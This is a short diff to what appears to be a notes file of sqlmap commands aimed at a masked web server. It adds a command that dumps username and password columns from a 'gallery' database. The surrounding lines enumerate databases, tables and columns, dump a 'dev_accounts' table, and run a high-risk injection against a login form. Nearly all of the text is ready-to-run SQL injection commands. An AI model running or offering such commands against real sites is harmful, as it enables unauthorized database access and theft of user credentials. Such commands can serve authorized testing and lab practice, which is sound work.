@@ -10,6 +10,8 @@ sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --dbs
 
 sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id --tables -D gallery --columns
 
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id --tables -D gallery -C username,password –dump 
+
 sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id -T dev_accounts --dump
 
 sqlmap -u "http://XX.XX.XX.XX/checklogin.php" --dbms=MySQL  --data="myusername=username&mypassword=password" --level=5 --risk=3  --dbs
